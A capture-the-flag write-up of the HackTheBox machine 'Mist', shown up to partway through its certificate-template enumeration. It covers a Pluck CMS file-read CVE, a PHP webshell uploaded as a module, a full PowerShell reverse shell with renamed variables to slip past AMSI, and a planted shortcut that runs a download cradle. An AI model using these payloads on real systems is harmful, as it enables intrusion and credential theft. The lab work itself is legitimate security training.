---
title: HTB: Mist
url: https://0xdf.gitlab.io/2024/10/26/htb-mist.html
date: 2024-10-26T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: htb-mist, ctf, hackthebox, nmap, windows, active-directory, pluck-cms, cve-2024-9405, pluck-module, webshell, php, amsi, defender, defender-bypass-directory, amsi-bypass, lnk, powershell-lnk, bloodhound, sharphound, certify, adcs, kerberos, rubeus, chisel, tunnel, netexec, proxychains, defender-exclusion, defender-exclusion-eventlog, defender-exclusion-mpcmdrun, ldap-signing, petitpotam, ntlmrelayx, relay, shadow-credential, secretsdump, keepass, cyberchef, hashcat, hashcat-mask, kpcli, readgmsapassword, gmsa, addkeycredentiallink, certipy, esc13, check-adcsesc13, htb-rabbit, htb-breadcrumbs, htb-buff, htb-support
---

![Mist](/img/mist-cover.png)

Mist is an insane-level Windows box mostly focused on Active Directory attacks. It starts off with a simple file disclosure vulneraility in Pluck CMS that allows me to leak the admin password and upload a malicious Pluck module to get a foothold on the webserver. There’s a directory at the filesystem root with links in it, and by overwriting one, I get execution as a user on the host. I’ll find LDAP signing is off, and use PetitPotam to coerce the server to authenticate to my, and relay that to the domain controller to get LDAP access as the machine account. I’ll add a shadow credential to that account and get auth as the machine account on the webserver. I’ll use machine access to get access to the local administrator account. In another user’s home directory I’ll find a KeePass database, along with an image showing a partial password. I’ll use Hashcat to break the database and get an account on the domain. From there, I’ll abuse multiple hops in Active Directory, reading a GMSA password, abusing AddKeyCredentialLink, and exploiting ADCS ESC 13 twice.

## Box Info

| Name | [Mist](https://hackthebox.com/machines/mist)  [Mist](https://hackthebox.com/machines/mist) [Play on HackTheBox](https://hackthebox.com/machines/mist) |
| --- | --- |
| Release Date | [30 Mar 2024](https://twitter.com/hackthebox_eu/status/1773424845046386954) |
| Retire Date | 26 Oct 2024 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Mist |
| Radar Graph | Radar chart for Mist |
| First Blood User | 07:47:57[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 10:24:48[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [Geiseric Geiseric](https://app.hackthebox.com/users/184611) |

## Recon

### nmap

`nmap` finds one open TCP port, HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:46 EDT
Nmap scan report for 10.10.11.17
Host is up (0.089s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
oxdf@hacky$ nmap -sCV -p 80 10.10.11.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:50 EDT
Nmap scan report for 10.10.11.17
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds

```

It’s a Windows host, but it’s running Apache with PHP

### Website - TCP 80

#### Site

The site is a blog about “Mist”:

![image-20241021155504904](/img/image-20241021155504904.png)

There’s a link to “admin” (`/login.php`):

![image-20241021155529231](/img/image-20241021155529231.png)

It’s an instance of [Pluck CMS](https://github.com/pluck-cms/pluck/wiki), and the version is 4.7.18.

#### Tech Stack

The HTTP response headers for the main site show Apache, PHP, and a `PHPSESSID` cookie being set:

```

HTTP/1.1 302 Found
Date: Mon, 21 Oct 2024 19:54:52 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
X-Powered-By: PHP/8.1.1
Set-Cookie: PHPSESSID=fmuq39t5n9vvji82p78ql34rip; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://10.10.11.17/?file=mist
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html;charset=utf-8

```

This all fits with Pluck, as it’s a PHP CMS.

The 404 page is the [Apache 404](/cheatsheets/404#apache--httpd):

![image-20241021155914706](/img/image-20241021155914706.png)

## Shell as svc\_web on MS01

### Recover Admin Password

#### Vulnerability Background

Some research will find [CVE-2024-9405](https://nvd.nist.gov/vuln/detail/CVE-2024-9405), a file read vuln in this exact version of Pluck. [This blog post](https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405) from m3n0sd0n4ld shows details. The `/data/modules/albums/albums_getimage.php?image=[filename]` path doesn’t check for authentication before returning a raw file. At the time of Mist’s release, this post didn’t exist, though there was [this issue](https://github.com/pluck-cms/pluck/issues/122) on the Pluck GitHub.

#### Directory Discovery

I didn’t show running `feroxbuster` against this site as it returns a ton, to the point that it’s not super useful, especially when I have the code and know what to expect. I’ll note that almost all the directories are listable, which is nice.

The GitHub issue shows enumeration modules from `/data/settings/modules/albums`Under `modules` there’s one directory, `albums`:

![image-20241021163150445](/img/image-20241021163150445.png)

`admin_backup.php` sounds interesting.

#### File Read

I’ll use the file read vulnerability to read these files:

```

oxdf@hacky$ curl http://10.10.11.17/data/modules/albums/albums_getimage.php?image=mist.php
<?php
$album_name = 'Mist';
?>30
oxdf@hacky$ curl http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>146

```

The first one looks like metadata for the CMS. The latter looks like a hash. `$ww` is the variable used to hold the admin hash in PluckCMS.

#### Crackstation

[CrackStation](https://crackstation.net/) identifies this as a SHA512 and crask it instantly:

![image-20241021163644800](/img/image-20241021163644800.png)

Entering the password at `/login.php` works:

![image-20241021163726842](/img/image-20241021163726842.png)

### Webshell Pluck Module

#### Create Module

I’ll create a simple PHP webshell in a directory:

```

oxdf@hacky$ cat mod0xdf/0xdf.php 
<?php system($_REQUEST['cmd']); ?>

```

I’ll add it to a zip archive:

```

oxdf@hacky$ zip -r notevil.zip mod0xdf
  adding: mod0xdf/ (stored 0%)
  adding: mod0xdf/0xdf.php (stored 0%)

```

#### Upload Module

The Pluck admin panel has a “Manage Modules” option under “options”:

![image-20241021164945450](/img/image-20241021164945450.png)

On that page is a “Install a module…” link:

![image-20241021165016236](/img/image-20241021165016236.png)

On that page, I’ll select `notevil.zip`:

![image-20241021165538231](/img/image-20241021165538231.png)

Now under `/data/modules` is `notevil`:

![image-20241021165613574](/img/image-20241021165613574.png)

The webshell is in there:

![image-20241021165634313](/img/image-20241021165634313.png)

There’s a cleanup script resetting installed modules every few minutes. If it disappears, I’ll just upload it again.

#### Shell Fail

Visiting `/data/modules/notevil/mod0xdf/0xdf.php?cmd=whoami` shows remote code execution as the svc\_web user on ms01:

![image-20241021165810049](/img/image-20241021165810049.png)

Interestingly, if I try to run a reverse shell such as “PowerShell #3 (Base64)” from [revshell.com](https://www.revshells.com/), nothing comes back.

I’ll send the request to Burp Repeater and make it a POST. Now I’ll try a download craddle:

![image-20241021170807955](/img/image-20241021170807955.png)

My Python webserver shows a hit, so there is still execution going on here:

```
10.10.11.17 - - [21/Oct/2024 17:08:00] code 404, message File not found
10.10.11.17 - - [21/Oct/2024 17:08:00] "GET /rev.ps1 HTTP/1.1" 404 -

```

I’ll try adding my reverse shell to `rev.ps1`, but it doesn’t work.

#### Bypass AMSI

[AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) is a technology build into Windows that is meant to protect Windows from malicious PowerShell (and other attacks). It’s likely what’s blocking my PowerShell reverse shell here.

Luckily for me, it is signature based. One trick to bypass it (at least at the time of this writing) is to get PowerShell #2 from [revshells.com](https://www.revshells.com/) and change all the variable names.

So:

```

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

Becomes:

```

$c = New-Object Net.Sockets.TCPClient('10.10.14.6',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close(

```

I’ll save this as `rev.ps1` and run the cradle via the webshell again:

```
10.10.11.17 - - [21/Oct/2024 17:22:07] "GET /rev.ps1 HTTP/1.1" 200 -

```

It downloads, and then there’s a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.17 58397

PS C:\xampp\htdocs\data\modules\notevil\mod0xdf>

```

## Shell as Brandon.Keywarp on MS01

### Enumeration

#### Host

This host is not the primary host, but a VM running on Mist. The IP address is 192.168.100.101 and the hostname is MS01:

```

PS C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.100.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100
PS C:\> hostname
MS01

```

The gateway is .100, which is likely the host.

#### Users

There are a few users on this VM:

```

PS C:\users> dir

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/20/2024   6:28 AM                Administrator
d-----         2/20/2024   6:02 AM                Administrator.MIST
d-----         3/20/2024   5:42 AM                Brandon.Keywarp
d-r---         2/20/2024   5:44 AM                Public
d-----         2/20/2024   9:39 AM                Sharon.Mullard
d-----         2/21/2024   3:46 AM                svc_web  

```

svc\_web can only access their directory and `Public`:

```

PS C:\users> tree . /f
Folder PATH listing
Volume serial number is 0000021F 560D:8100
C:\USERS
+---Administrator
+---Administrator.MIST
+---Brandon.Keywarp
+---Public
?   +---Documents
?   +---Downloads
?   +---Music
?   +---Pictures
?   +---Videos
+---Sharon.Mullard
+---svc_web
    +---Desktop
    +---Documents
    +---Downloads
    +---Favorites
    +---Links
    +---Music
    +---Pictures
    +---Saved Games
    +---Videos

```

Nothing interesting.

There are a couple other local accounts:

```

PS C:\> net user

User accounts for \\MS01
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
svc_web                  WDAGUtilityAccount       
The command completed successfully.

```

The others must be domain accounts, but svc\_web doesn’t have access to the domain information.

#### Root

In the root of the filesystem, there’s a non-standard directory, `Common Applications`:

```

PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2024   1:50 AM                Common Applications
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         2/20/2024   5:44 AM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         2/21/2024  12:37 PM                Users
d-----         3/26/2024  12:02 PM                Windows
d-----         3/10/2024   3:21 AM                xampp

```

It has three shortcut files in it:

```

PS C:\Common Applications> ls

    Directory: C:\Common Applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:15 AM           1118 Calculator.lnk
-a----          5/7/2021   3:14 PM           1175 Notepad.lnk
-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk

```

This directory is also shared over SMB as `Common Applications`:

```

PS C:\Common Applications> net view \\MS01
Shared resources at \\MS01

Share name           Type  Used as  Comment  
-------------------------------------------------------------------------------
Common Applications  Disk                    
The command completed successfully.

```

I am able to write to this directory:

```

PS C:\Common Applications> ls

    Directory: C:\Common Applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/21/2024   2:41 PM             14 0xdf.lnk
-a----          5/8/2021   1:15 AM           1118 Calculator.lnk
-a----          5/7/2021   3:14 PM           1175 Notepad.lnk
-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk 

```

### Malicious Link

I’ll overwrite one of the links in the `Common Applications` directory with a malicious one to see if anyone clicks on it. [This Medium post](https://medium.com/@dbilanoski/how-to-tuesdays-shortcuts-with-powershell-how-to-make-customize-and-point-them-to-places-1ee528af2763) talks about making `.lnk` files with PowerShell.

```

PS C:\Common Applications> $WScriptShell = New-Object -ComObject WScript.Shell
PS C:\Common Applications> $Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
PS C:\Common Applications> $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS C:\Common Applications> $Shortcut.Arguments = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.6/rev.ps1')"
PS C:\Common Applications> $Shortcut.Save()

```

On calling `Save()`, it overwrites the file, as can be seen in the updated LastWriteTime:

```

PS C:\Common Applications> ls

    Directory: C:\Common Applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:15 AM           1118 Calculator.lnk
-a----        10/21/2024   3:23 PM           1318 Notepad.lnk
-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk    

```

After a couple minutes, there’s a request at my webserver:

```
10.10.11.17 - - [21/Oct/2024 18:24:56] "GET /rev.ps1 HTTP/1.1" 200 -

```

And a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443

Connection received on 10.10.11.17 50177
PS C:\Windows\system32> whoami
mist\brandon.keywarp

```

## Auth as MS01$

### Bloodhound

#### Collection

Now that I have access to a domain account, I’ll collect Bloodhound data. I’ll grab the [latest release](https://github.com/BloodHoundAD/SharpHound/releases) from SharpHound, upload the `.exe` to MS01, and run it:

```

PS C:\xampp\htdocs\files> .\sharphound.exe -c All
2024-10-23T13:23:16.2439234-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2024-10-23T13:23:16.5408065-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2024-10-23T13:23:16.5876749-07:00|INFORMATION|Initializing SharpHound at 1:23 PM on 10/23/2024
2024-10-23T13:23:16.6658347-07:00|INFORMATION|Resolved current domain to mist.htb
2024-10-23T13:23:17.2908701-07:00|INFORMATION|Loaded cache with stats: 21 ID to type mappings.
 2 name to SID mappings.
 2 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2024-10-23T13:23:17.3220500-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2024-10-23T13:23:17.4939233-07:00|INFORMATION|Beginning LDAP search for mist.htb
2024-10-23T13:23:17.6501737-07:00|INFORMATION|Beginning LDAP search for mist.htb Configuration NC
2024-10-23T13:23:17.6970488-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-23T13:23:17.6970488-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-23T13:23:17.8064236-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MIST.HTB
2024-10-23T13:23:18.0876860-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MIST.HTB
2024-10-23T13:23:18.2126706-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MIST.HTB
2024-10-23T13:23:18.5408484-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MIST.HTB
2024-10-23T13:23:19.3220515-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MIST.HTB
2024-10-23T13:23:20.3699293-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-23T13:23:20.3857098-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-23T13:23:20.6050370-07:00|INFORMATION|Status: 360 objects finished (+360 120)/s -- Using 43 MB RAM
2024-10-23T13:23:20.6050370-07:00|INFORMATION|Enumeration finished in 00:00:03.1402960
2024-10-23T13:23:20.7769038-07:00|INFORMATION|Saving cache with stats: 21 ID to type mappings.
 2 name to SID mappings.
 2 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2024-10-23T13:23:20.7925380-07:00|INFORMATION|SharpHound Enumeration Completed at 1:23 PM on 10/23/2024! Happy Graphing!

```

I’ll use `smbserver.py` to exfil this back to my host.

#### File Ingest

This latest SharpHound is good with the BloodHound-CE edition. I’ll start it as a docker container using a single command:

```

oxdf@hacky$ curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   190  100   190    0     0   1701      0 --:--:-- --:--:-- --:--:--  1711
100  3784  100  3784    0     0  10594      0 --:--:-- --:--:-- --:--:-- 10594
[+] Running 3/3
 ✔ Container mist-10101117-graph-db-1    Running                                                                                                                     0.0s
 ✔ Container mist-10101117-app-db-1      Running                                                                                                                     0.0s
 ✔ Container mist-10101117-bloodhound-1  Recreated                                                                                                                   0.1s
Attaching to app-db-1, bloodhound-1, graph-db-1
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.411226832Z","message":"Reading configuration found at /bloodhound.config.json"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.411647473Z","message":"Logging configured"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.446486924Z","message":"No database driver has been set for migration, using: neo4j"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.446547825Z","message":"Connecting to graph using Neo4j"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.447226875Z","message":"Starting daemon Tools API"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.450835283Z","message":"This is a new SQL database. Initializing schema..."}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.450845528Z","message":"Creating migration schema..."}
b
...[snip]...

```

I’m using the environment variable `BLOODHOUND_PORT=8888` to set the port the web interface runs on, as by default it wants 8080, which Burp already has on my system (alternatively, I could just close Burp).

There’s a ton more output. It’s important to catch where it prints admin password:

```

bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:51.011878995Z","message":"###################################################################"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:51.01192903Z","message":"#                                                                 #"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:51.011931701Z","message":"# Initial Password Set To:    vgeHwpCRUiLlPZ0qFnYtjMMBBubby4zs    #"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:51.011933302Z","message":"#                                                                 #"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:51.011934683Z","message":"###################################################################"}

```

I’ll log in using admin / that password and go to the Gear –> “Administration” –> “File Injest” page, where I can upload my file.

#### Analysis

On the “Explore” tab, I’ll search for Brandon.Keywarp and mark them as owned. I’ll look at “Outbound Object Control”, and note that BloodHound-CE shows certificates as well:

![image-20241023164245998](/img/image-20241023164245998.png)

Looks like all members of the Domain Users ground can us the Mist-DC01-CA to enroll in a handful of templates.

Not much else here.

### Recover Brandon.Keywrap NTLM

#### Overview

To do proper enumeration in order to move forward, it’ll be a lot easier with the password or NTLM hash of Brandon.Keywrap. To do this, I’ll:
- Use `Certify.exe` to request a certificate as the user.
- `openssl` to change the format of the resulting certificate
- `Rubeus.exe` to get the NTLM hash using the certificate.

I’ll grab copies of `Certify.exe` and `Rubeus.exe` from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any) and upload them to Mist to `C:\xampp\htdocs\files`.

#### Get Certificate

If I hadn’t run Bloodhound, I could also get a list of the templates and the CA information from `Certify.exe find /enrollable`, which will list the various certificate templates available to this user:

```

PS C:\xampp\htdocs\files> .\Certify.exe find /enrollable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mist,DC=htb'

[*] Listing info about the Enterprise CA 'mist-DC01-CA'

    Enterprise CA Name            : mist-DC01-CA
    DNS Hostname                  : DC01.mist.htb
    FullName                      : DC01.mist.htb\mist-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb
    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E
    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0
    Cert Start Date               : 2/15/2024 7:07:23 AM
    Cert End Date                 : 2/15/2123 7:17:23 AM
    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : WebServer
